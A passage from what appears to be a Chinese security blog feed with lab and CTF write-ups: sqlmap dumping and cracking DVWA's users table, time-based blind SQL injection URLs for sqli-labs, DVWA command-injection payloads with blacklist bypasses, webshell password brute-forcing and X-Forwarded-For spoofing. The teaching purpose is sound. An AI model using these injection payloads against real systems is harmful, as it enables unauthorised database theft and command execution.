“。你想跟上吗？[y/n]</p><p>根据该提示，可以判断(302重定向)跳转至登录页面，看来需要带cookie，否则可能无法正常执行。</p><blockquote><p>解释：web应用需要登录的时候需要加 cookie参数</p></blockquote><p>不加则如下：</p><p><img src="https://img-blog.csdnimg.cn/20201105210027467.png#pic_center" alt="在这里插入图片描述"><br>F12打开控制台，在网络里得到Cookie信息。</p><pre><code class="java">PHPSESSID    &quot;lqumo7do6sle0vl4gi7b9qqd57&quot;security    &quot;low&quot;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201105210545491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="M6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center)"><br>加上带cookie参数再次测试：</p><pre><code class="python"> python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot;</code></pre><p>得到：</p><pre><code class="sql">the back-end DBMS is MySQL //后台数据库管理系统：MySQLweb server operating system: Windows //Web服务武器操作系统：Windowsweb application technology: PHP 5.4.45, Apache 2.4.23 //Web应用技术： PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 //后台数据库：MySQL</code></pre><p><img src="https://img-blog.csdnimg.cn/20201105212241569.png#pic_center" alt="在这里插入图片描述"><br>发现sqlmap可以跑出数据来了，构造其他语句，继续查取数据。</p><p>2、列出数据库信息：</p><pre><code class="java">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;s ecurity=low&quot; --dbs</code></pre><p><code>--dbs</code> 表示列出目标有哪些数据库</p><p>得到8个mysql下数据库名：<br><img src="https://img-blog.csdnimg.cn/20201105214939645.png" alt="在这里插入图片描述"></p><p>3、获取当前的数据库：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --current-db</code></pre><p>  <code>--current-db</code>得到当前使用的数据库</p><p><img src="https://img-blog.csdnimg.cn/20201105215718669.png#pic_center" alt="在这里插入图片描述"><br>得到：<code>current database: &#39;dvwa&#39;</code></p><p>即：当前数据库名为：dvwa</p><p>4、获取当前数据库下的表：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --table -D &quot;dvwa&quot;</code></pre><p><code>--table -D &quot;xxx&quot;</code> ：得到xxx数据库下面的表<br><img src="https://img-blog.csdnimg.cn/20201105221313664.png" alt="在这里插入图片描述"><br>5、获取数据库dvwa下user表的字段：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --columns -T &quot;users&quot; -D &quot;dvwa&quot;</code></pre><p><code>--columns -T &quot;&quot; -D &quot;&quot;</code> 得到数据库下面的表下面的列(columns)</p><p>得到：<br><img src="https://img-blog.csdnimg.cn/2020110522281247.png" alt="在这里插入图片描述"></p><p>6、获取user表里的字段值：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --dump -T users -D dvwa  </code></pre><p>过程中会出现的部分提示信息：</p><pre><code class="java">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]您是否要将散列存储到临时文件中，以便最终使用其他工具进行进一步处理do you want to crack them via a dictionary-based attack? [Y/n/q]您是否想通过基于字典的攻击来破解它们？what dictionary do you want to use?用什么字典来破解？[1] default dictionary file &#39;C:\WangAn\Sqlmap\txt\wordlist.zip&#39; (press Enter)[2] custom dictionary file[3] file with list of dictionary files回车会直接使用第一个do you want to use common password suffixes? (slow!) [y/N]您是否要使用通用密码后缀？ （慢！）</code></pre><p>最终得到：<br><img src="https://img-blog.csdnimg.cn/2020110523301156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>至此，dvwa的low级别使用SQLMap工具注入完成。</p><p><strong>下面是一些Sqlmap常用选项：</strong></p><pre><code class="python">sqlmap -u &quot;注入地址&quot; --dbs          // 列举数据库sqlmap -u &quot;注入地址&quot; --tables -D &quot;数据库&quot; // 列举数据库的表名sqlmap -u &quot;注入地址&quot; --columns -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表的列名sqlmap -u &quot;注入地址&quot; --dump  -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中指定字段的数据sqlmap -u &quot;注入地址&quot; --dump -C &quot;字段,字段&quot; -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中的所有数据sqlmap -r &quot;含http头的文件&quot; --dbs          // 列举数据库sqlmap -r &quot;含http头的文件&quot; --tables -D &quot;数据库&quot; // 列举数据库的表名sqlmap -r &quot;含http头的文件&quot; --columns -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表的列名sqlmap -r &quot;注入地址&quot; --dump  -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中指定字段的数据sqlmap -r &quot;含http头的文件&quot; --dump -C &quot;字段,字段&quot; -T &quot;表名&quot; -D &quot;数据库&quot; // 获取表中的所有数据</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku——web（一）</title>
      <link href="2019/09/12/Bugku%E2%80%94web%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2019/09/12/Bugku%E2%80%94web%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>最近做了几个bugku的web题，感觉挺有意思的，学到了不少东西；顺便总结下。（=￣ω￣=）</p><a id="more"></a><p>前言：<br>最近做了几个bugku的web题，感觉挺有意思的，学到了不少东西；顺便总结下。（=￣ω￣=）<hr></p><p><strong>1、你必须让他停下</strong>：<br><img src="https://img-blog.csdnimg.cn/20190903210137651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接，发现有个一直在闪的页面，时不时还会出现张图片；这是用了 js的<code>setTimeout</code>函数，只需在设置中禁用js,然后手动刷新界面直到出现图片，然后再查看源代码flag就会flag出来了。</p><ul><li>谷歌游览器关闭<strong>JavaScrip</strong>：设置→高级→隐私设置→网站设置，找到并关闭。<br><img src="https://img-blog.csdnimg.cn/20190904192547427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有就是可以用抓包工具（burp），<code>Send to Repeater</code>,然后多点几次send，就能得到flag了。<br><img src="https://img-blog.csdnimg.cn/20190904193636341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p><strong>2、web5</strong> :<img src="https://img-blog.csdnimg.cn/20190903204530749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接，是一个表单提交页面，无论你输入什么，都会给你提示：再好好看看（还是错别字2333…），右键查看下源码：<br><img src="https://img-blog.csdnimg.cn/2019090520260490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度发现是jother编码。然后将它复制粘贴到console中回车，出现了flag<br><img src="https://img-blog.csdnimg.cn/20190904194434274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提交<br><img src="https://img-blog.csdnimg.cn/20190905202756507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看下格式，应该是大写<br><img src="https://img-blog.csdnimg.cn/20190905203027603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>退出去提交，成功。</p><p><strong>3、头等舱</strong><br><img src="https://img-blog.csdnimg.cn/20190905203128976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开发现什么也没有…，查看源码也啥也没有。没什么好说的了，抓包！<br>Send to repeater →send发包<br>得到flag。<br><img src="https://img-blog.csdnimg.cn/20190905203725971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4、网站被黑</strong><br><img src="https://img-blog.csdnimg.cn/20190905204738646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如题所说，这题没什么技术含量，但实战中经常用到；打开：<br><img src="https://img-blog.csdnimg.cn/20190905204657691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个页面挺好玩，感觉前端好NB。<br>直接御剑扫描下<br><img src="https://img-blog.csdnimg.cn/20190905205838694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到两个链接，打开后缀为shell.php的<br><img src="https://img-blog.csdnimg.cn/20190905210305649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就去爆破密码，使用的工具是Burp（想要的同学可以私信我）<br>在shell.php里随便输入一个密码，抓包，设置变量<br><img src="https://img-blog.csdnimg.cn/20190905211006428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Add from list 那选为password 这是一个burp pro里自带的一个字典<br><img src="https://img-blog.csdnimg.cn/20190905211104895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Start attack 开始爆破。<br><img src="https://img-blog.csdnimg.cn/20190905211303913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">第一个即为密码，输入密码得到flag<br><img src="https://img-blog.csdnimg.cn/20190905211542446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>5、管理员系统</strong><br><img src="https://img-blog.csdnimg.cn/20190908191607434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接，是一个表单提交页面：<br><img src="https://img-blog.csdnimg.cn/2019090819175197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现我无论输入什么，都会得到一句反馈：IP禁止访问，请联系本地管理员登陆，IP已被记录.<br>查看源码，在最后一行发现一串编码：<code>&lt;!-- dGVzdDEyMw== --&gt;</code> 一看就是base64编码，解码得到：<code>test123</code>，这里盲猜usename为：admin ，将<code>test123</code>作为密码，<br>根据“IP禁止访问，请联系本地管理员登陆，IP已被记录.”这句得到新思路：伪装成本地访问：<br>　　抓包；改包：Headers中增添一对键值对：<code>X-Forwarded-For : 127.0.0.1</code><br>　　得到flag<br>　　<img src="https://img-blog.csdnimg.cn/20190911225704754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间盲注详解 Sqli-labs闯关(Less 9—10)</title>
      <link href="2019/09/01/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%20Sqli-labs%E9%97%AF%E5%85%B3(Less%209%E2%80%9410)/"/>
      <url>2019/09/01/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%20Sqli-labs%E9%97%AF%E5%85%B3(Less%209%E2%80%9410)/</url>
      
        <content type="html"><![CDATA[<p>今天来总结下时间盲注的知识。<hr></p><p>时间盲注和bool盲注是很像的，区别就是“参照物”不同，基于bool的盲注可以通过页面的一些变化来进行判断结果，但是有时候，执行一些sql语句的测试，页面不会有像布尔盲注的时候直观的变化，这个时候可以在基于布尔的盲注上结合<code>if</code>判断和<code>sleep()</code>函数来得到一个时间上的变换延迟的参照，也就可以让我们进行一些判断。也就是所谓的基于时间的盲注。</p><p>直接看题吧<br><strong>Less-9</strong> 基于时间的单引号盲注<br><img src="http://img-blog.csdnimg.cn/2019072723363099.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用<code>if(查询语句,1,sleep(5))</code>，即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确。</p><ol><li> <code>if(expr1,expr2,expr3)</code>:判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</li><li><code>sleep(n)</code>：将程序挂起一段时间 n单位为秒<br>根据题目提示，已经知道了为单引号注入。</li></ol><ul><li>猜测数据库：<br><code>http://127.0.0.1/sqli-labs-master/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code><br>说明第一位是 s （ascii 码是 115）<br><code>http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+</code> 说明第二位是 e （ascii 码是 101） …. 以此类推，我们知道了数据库名字是 security</li><li>猜测 security 的数据表：<br><code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101,1,sleep(5))--+</code> </li><li>猜测第一个数据表的第一位是 e,…依次类推，得到 emails<br><code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#39;security&#39; limit 1,1),1,1))=114,1,sleep(5))--+</code> </li><li>猜测第二个数据表的第一位是 r,…依次类推，得到 referers … 再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users 猜测 users 表的列：<br><code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from information _schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105,1,sleep(5))--+</code> </li><li>猜测 users 表的第一个列的第一个字符是 i， 以此类推，我们得到列名是 id，username，password</li><li>猜测 username 的值： <code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+</code> </li><li>猜测 username 的第一行的第一位 以此类推，我们得到数据库 username，password 的所有内容。<br>less10 只是把单引号换成了双引号，其他同理。 </li></ul><p>以上的过程就是我们利用 sleep()函数注入的整个过程。<br>手动注入过程很是繁琐，可以用二分法提高效率，但大部分情况下都会选择我们写脚本注入。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞（Commnd Execution）总结</title>
      <link href="2019/08/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88Commnd%20Execution%EF%BC%89%E6%80%BB%E7%BB%93/"/>
      <url>2019/08/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88Commnd%20Execution%EF%BC%89%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>&emsp; &emsp;这周来学习下命令执行漏洞；命令执行漏洞是用户通过浏览器在远程服务器上执行任意系统命令，与代码执行漏洞没有太大的区别，不过我们在学习时还是要区分不同的概念。关于代码执行漏洞会在下篇博客中详述。</p><p><strong>一、什么是命令执行漏洞</strong>：</p><p>应用 有时需要调用一些执行系统命令的函数，如PHP中的<code>system</code>、<code>exec</code>、<code>shell_exec</code>、<code>passthru</code>、<code>popen</code>、<code>proc_popen</code>等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p><strong>二、命令执行漏洞产生原因</strong>：</p><ul><li>开发人员没有对特殊函数入口做过滤，导致用户可以提交恶意代码并提交服务端执行。</li><li>Web服务器没有过滤危险函数导致命令执行漏洞攻击成功。</li></ul><p><strong>三、PHP中的危险函数</strong>：</p><p><code>system</code>：成功则返回命令输出的最后一行，失败则返回FALSE。<br><code>exec</code>：命令执行结果的最后一行内容。<br><code>shell_exec</code>：命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回NULL。<br><code>passthru</code>：执行外部程序并且显示原始输出。<br><code>eval</code>：将输入的字符串参数当做PHP程序代码来执行。<br><code>assert</code><br><code>preg_replace</code><br><code>call_user_func</code></p><p><strong>四、命令执行漏洞的危害</strong>：</p><ul><li>任意执行系统命令</li><li>恶意木马被种植</li><li>挂马、钓鱼</li><li>敏感信息泄露</li></ul><p><strong>常用的命令连接符</strong>：</p><p>在windows和linux都支持，如果程序没有进行过滤，那么我们可以通过连接符来执行多条命令。</p><pre><code>A&amp;&amp;B   先执行A，执行成功后执行B，否则不执行BA|B    只执行BA&amp;B    先执行A，不管是否成功，都会执行BA;B    先执行A，再执行BA&amp;B    简单拼接，A B之间无制约关系</code></pre><p>了解了这些知识后，下面就在本地搭建的DVWA中练习下。</p><h2 id="DVWA—Command-Injection（命令注入）"><a href="#DVWA—Command-Injection（命令注入）" class="headerlink" title="DVWA—Command Injection（命令注入）"></a>DVWA—Command Injection（命令注入）</h2><p><img src="http://img-blog.csdnimg.cn/20190820151202475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先从Low级别开始：<br>查看源码：</p><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</code></pre><p>可以看到，low级别的代码接收了用户输入的ip，服务器通过判断操作系统执行不同<strong>ping命令</strong>。但是这里对用户输入的ip并没有进行任何的过滤，所以存在可利用的命令执行漏洞。</p><p>用<code>&amp;&amp;</code>来执行多条命令，构造payload：<code>127.0.0.1&amp;&amp;net user</code><br><img src="http://img-blog.csdnimg.cn/20190820161837141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行成功；（如果存在乱码问题，把<code>DVWA\dvwa\includes</code>目录下的<code>dvwaPage.inc.php</code>文件中所有的<code>”charset=utf-8”</code>，全部替换修改为<code>”charset=gb2312”</code>即可）</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Set blacklist    $substitutions = array(        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; </code></pre><p>可以看到，medium级别相较于low级别的代码 只增加了对 <code>&amp;&amp;</code> 和 <code>；</code>的过滤，绕过也很简单，不用 <code>&amp;&amp;</code> ，直接用 <code>&amp;</code>不就好起来了吗！</p><p><code>&amp;&amp;</code>和<code>&amp;</code>的区别在于<code>&amp;&amp;</code>是执行完前面的命令然后执行后面的命令，<code>&amp;</code>是不管前面的命令是否值执行，后面的都执行。</p><p>构造poyload：<code>127.0.0.1&amp;ipconfig</code></p><p><img src="http://img-blog.csdnimg.cn/2019082016482838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绕过执行成功！</p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>源码：</p><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = trim($_REQUEST[ &#39;ip&#39; ]);    // Set blacklist    $substitutions = array(        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,        &#39;| &#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; </code></pre><p>相比于前面两个等级的，high等级的黑名单更完善了，但是由我们可以看出来他只是过滤掉了<code>“| ”</code>，如果用<code>|</code>后不跟空格就可以绕过过滤。<br>构造payload：<code>127.0.0.1|dir</code><br><img src="http://img-blog.csdnimg.cn/20190820170652732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绕过成功。</p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>源码：</p><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        &#125;        else &#123;            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        &#125;        // Feedback for the end user        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Ops. Let the user name theres a mistake        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><p>了解下几个函数：<br><code>stripslashes(string)</code> : 该函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p><code>explode(separator,string,limit)</code>: 该函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p><p><code>is_numeric(string)</code>: 该检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p><p>可以看到 Impossible级别的代码加入了<code>Anti-CSRF token</code>，至于什么是<code>Anti-CSRF token</code>请点击 <a href="https://www.owasp.org/index.php/Anti_CSRF_Tokens_ASP.NET">链接</a> 查看；同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。<br>好了，关于命令执行漏洞这次就先总结到这，下篇会更代码执行漏洞的知识。(●’◡’●)</p><p>参考博客：<br>  <a href="https://blog.csdn.net/qq_36119192/article/details/82917250">https://blog.csdn.net/qq_36119192/article/details/82917250</a><br>  <a href="https://blog.csdn.net/jpygx123/article/details/83276533">https://blog.csdn.net/jpygx123/article/details/83276533</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学—RSA加密解密详解！</title>
